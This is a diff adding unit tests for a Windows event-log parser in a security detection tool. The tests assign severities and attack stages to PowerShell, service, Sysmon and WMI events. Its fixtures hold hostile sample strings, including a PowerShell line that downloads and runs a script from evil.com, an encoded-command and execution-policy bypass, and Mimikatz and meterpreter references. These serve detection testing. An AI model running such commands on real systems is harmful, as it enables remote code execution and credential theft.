@@ -372,3 +372,302 @@ class TestN1NewEIDs:
         }
         for action, stage in expected.items():
             assert STAGE_MAP.get(action) == stage, f"{action}: beklenen {stage}, bulunan {STAGE_MAP.get(action)}"
+
+
+class TestNewEIDs:
+    """17 yeni EID için testler."""
+
+    def _xml(self, eid: int, **fields) -> str:
+        return _make_xml(eid, **fields)
+
+    # ── 4624 logon_type=3 lateral logon ──────────────────────────────
+
+    def test_4624_network_logon_is_lateral(self):
+        xml = self._xml(4624, TargetUserName="admin", IpAddress="10.0.0.5", LogonType="3")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_lateral_logon"
+        assert r["severity"] == "warning"
+        assert r["source_ip"] == "10.0.0.5"
+
+    def test_4624_interactive_logon_not_lateral(self):
+        xml = self._xml(4624, TargetUserName="admin", IpAddress="10.0.0.5", LogonType="2")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_logon_success"
+
+    def test_4624_network_no_ip_not_lateral(self):
+        xml = self._xml(4624, TargetUserName="admin", IpAddress="-", LogonType="3")
+        r = _parse_record_xml(xml)
+        assert r is not None
+
+    # ── Security yeni EID'ler ─────────────────────────────────────────
+
+    def test_4741_computer_account_changed(self):
+        xml = self._xml(4741, SubjectUserName="attacker",
+                        TargetUserName="CORP-PC$", TargetDomainName="CORP")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_computer_account_changed"
+        assert r["severity"] == "warning"
+        assert "CORP-PC$" in r["message"]
+
+    def test_4614_security_package_registered(self):
+        xml = self._xml(4614, AuthenticationPackageName="EvilProvider.dll")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_logon_process_registered"
+        assert "EvilProvider" in r["message"]
+
+    def test_4703_token_privilege_sedebug_critical(self):
+        xml = self._xml(4703, SubjectUserName="attacker", TargetUserName="lsass",
+                        EnabledPrivilegeList="SeDebugPrivilege", DisabledPrivilegeList="")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_token_privilege_adjusted"
+        assert r["severity"] == "critical"
+
+    def test_4703_token_privilege_normal_warning(self):
+        xml = self._xml(4703, SubjectUserName="user", TargetUserName="proc",
+                        EnabledPrivilegeList="SeShutdownPrivilege", DisabledPrivilegeList="")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "warning"
+
+    # ── PowerShell kanalı ─────────────────────────────────────────────
+
+    def test_4103_powershell_module_dangerous_critical(self):
+        xml = self._xml(4103, Payload="Invoke-Mimikatz credential dump",
+                        HostApplication="powershell.exe -nop")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_powershell_module"
+        assert r["severity"] == "critical"
+
+    def test_4103_powershell_module_normal_info(self):
+        xml = self._xml(4103, Payload="Get-Process -Name notepad",
+                        HostApplication="powershell.exe")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "info"
+
+    def test_4104_scriptblock_iex_critical(self):
+        xml = self._xml(4104,
+                        ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
+                        Path="")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_powershell_scriptblock"
+        assert r["severity"] == "critical"
+
+    def test_4104_scriptblock_encodedcommand_critical(self):
+        xml = self._xml(4104, ScriptBlockText="powershell -EncodedCommand SGVsbG8=", Path="")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "critical"
+
+    def test_4104_scriptblock_normal_warning(self):
+        xml = self._xml(4104, ScriptBlockText="Get-Date", Path="C:\\scripts\\check.ps1")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_powershell_scriptblock"
+        assert r["severity"] == "warning"
+
+    def test_4104_scriptblock_bypass_critical(self):
+        xml = self._xml(4104,
+                        ScriptBlockText="Set-ExecutionPolicy Bypass -Force",
+                        Path="")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "critical"
+
+    # ── System kanalı ─────────────────────────────────────────────────
+
+    def test_7045_service_suspicious_binary_critical(self):
+        xml = self._xml(7045, ServiceName="EvilSvc",
+                        ImagePath=r"C:\temp\powershell.exe -nop -w hidden -c evil",
+                        AccountName="LocalSystem")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_service_installed"
+        assert r["severity"] == "critical"
+
+    def test_7045_service_normal_warning(self):
+        xml = self._xml(7045, ServiceName="MyApp",
+                        ImagePath=r"C:\Program Files\MyApp\service.exe",
+                        AccountName="LocalSystem")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "warning"
+
+    def test_7034_service_crashed(self):
+        xml = self._xml(7034, ServiceName="CriticalService")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_service_crashed"
+        assert r["severity"] == "warning"
+
+    def test_7040_service_reactivated_critical(self):
+        xml = self._xml(7040, ServiceName="DefenderSvc",
+                        StartTypeBefore="disabled",
+                        StartType="auto start")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_service_start_changed"
+        assert r["severity"] == "critical"
+
+    def test_7040_service_normal_warning(self):
+        xml = self._xml(7040, ServiceName="MyService",
+                        StartTypeBefore="auto start",
+                        StartType="demand start")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "warning"
+
+    # ── AppLocker ─────────────────────────────────────────────────────
+
+    def test_8004_applocker_blocked(self):
+        xml = self._xml(8004, FilePath=r"C:\Users\victim\Downloads\malware.exe",
+                        Publisher="Unknown", User="CORP\\jdoe")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_applocker_blocked"
+        assert r["severity"] == "warning"
+
+    # ── Sysmon yeni EID'ler ────────────────────────────────────────────
+
+    def test_sysmon_8_remote_thread_always_critical(self):
+        xml = self._xml(8, SourceImage=r"C:\tools\injector.exe",
+                        TargetImage=r"C:\Windows\System32\lsass.exe",
+                        StartAddress="0x7ff800000000", StartFunction="LoadLibraryA")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_remote_thread"
+        assert r["severity"] == "critical"
+
+    def test_sysmon_8_normal_process_still_critical(self):
+        xml = self._xml(8, SourceImage=r"C:\Windows\explorer.exe",
+                        TargetImage=r"C:\Windows\notepad.exe",
+                        StartAddress="0x7ff800000000", StartFunction="")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "critical"
+
+    def test_sysmon_9_raw_access_malware_critical(self):
+        xml = self._xml(9, Image=r"C:\evil\mimikatz.exe",
+                        Device=r"\\.\PhysicalDrive0")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_raw_access"
+        assert r["severity"] == "critical"
+
+    def test_sysmon_9_raw_access_unknown_warning(self):
+        xml = self._xml(9, Image=r"C:\backup\backup.exe",
+                        Device=r"\\.\GLOBALROOT\Device\HarddiskVolume1")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "warning"
+
+    def test_sysmon_15_ads_detected(self):
+        xml = self._xml(15, Image=r"C:\Windows\cmd.exe",
+                        TargetFilename=r"C:\Users\victim\doc.docx:Zone.Identifier",
+                        Hash="SHA256=abc123")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_ads"
+        assert r["severity"] == "warning"
+
+    def test_sysmon_17_suspicious_pipe_critical(self):
+        xml = self._xml(17, Image=r"C:\Windows\System32\svchost.exe",
+                        PipeName="\\meterpreter_12345")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_pipe_created"
+        assert r["severity"] == "critical"
+
+    def test_sysmon_17_normal_pipe_warning(self):
+        xml = self._xml(17, Image=r"C:\Windows\System32\svchost.exe",
+                        PipeName="\\chrome.12345.pipe")
+        r = _parse_record_xml(xml)
+        assert r["severity"] == "warning"
+
+    def test_sysmon_18_pipe_connected(self):
+        xml = self._xml(18, Image=r"C:\evil\loader.exe",
+                        PipeName="\\postex_1234")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_pipe_connected"
+        assert r["severity"] == "critical"
+
+    def test_sysmon_19_wmi_event_filter(self):
+        xml = self._xml(19, User="CORP\\attacker", Name="EvilFilter",
+                        Query="SELECT * FROM __InstanceCreationEvent",
+                        EventNamespace="root\\subscription")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_wmi_event"
+        assert r["severity"] == "critical"
+
+    def test_sysmon_21_wmi_binding(self):
+        xml = self._xml(21, User="CORP\\attacker",
+                        Consumer="CommandLineEventConsumer.Name=\"EvilConsumer\"",
+                        Filter="EvilFilter")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_wmi_binding"
+        assert r["severity"] == "critical"
+
+    def test_sysmon_25_process_tamper(self):
+        xml = self._xml(25, Image=r"C:\Windows\System32\lsass.exe",
+                        Type="Herpaderping")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["event_action"] == "windows_sysmon_process_tamper"
+        assert r["severity"] == "critical"
+
+    # ── parsers/windows.py kategori testleri ─────────────────────────
+
+    def test_new_actions_have_category(self):
+        from server.parsers.windows import _ACTION_TO_CATEGORY
+        new_actions = [
+            "windows_lateral_logon",
+            "windows_computer_account_changed",
+            "windows_logon_process_registered",
+            "windows_token_privilege_adjusted",
+            "windows_powershell_module",
+            "windows_powershell_scriptblock",
+            "windows_service_installed",
+            "windows_service_crashed",
+            "windows_service_start_changed",
+            "windows_applocker_blocked",
+            "windows_sysmon_remote_thread",
+            "windows_sysmon_raw_access",
+            "windows_sysmon_ads",
+            "windows_sysmon_pipe_created",
+            "windows_sysmon_pipe_connected",
+            "windows_sysmon_wmi_event",
+            "windows_sysmon_wmi_binding",
+            "windows_sysmon_process_tamper",
+        ]
+        for action in new_actions:
+            assert action in _ACTION_TO_CATEGORY, f"Eksik kategori mapping: {action}"
+
+    # ── attack_chain.py STAGE_MAP testleri ───────────────────────────
+
+    def test_new_actions_in_stage_map(self):
+        from server.attack_chain import STAGE_MAP
+        expected = {
+            "windows_lateral_logon":            "lateral",
+            "windows_computer_account_changed": "execute",
+            "windows_logon_process_registered": "execute",
+            "windows_token_privilege_adjusted": "execute",
+            "windows_powershell_module":        "execute",
+            "windows_powershell_scriptblock":   "execute",
+            "windows_service_installed":        "execute",
+            "windows_service_crashed":          "execute",
+            "windows_service_start_changed":    "execute",
+            "windows_applocker_blocked":        "execute",
+            "windows_sysmon_remote_thread":     "execute",
+            "windows_sysmon_raw_access":        "execute",
+            "windows_sysmon_ads":               "execute",
+            "windows_sysmon_pipe_created":      "lateral",
+            "windows_sysmon_pipe_connected":    "lateral",
+            "windows_sysmon_wmi_event":         "lateral",
+            "windows_sysmon_wmi_binding":       "lateral",
+            "windows_sysmon_process_tamper":    "execute",
+        }
+        for action, stage in expected.items():
+            assert STAGE_MAP.get(action) == stage, \
+                f"{action}: beklenen={stage}, bulunan={STAGE_MAP.get(action)}"
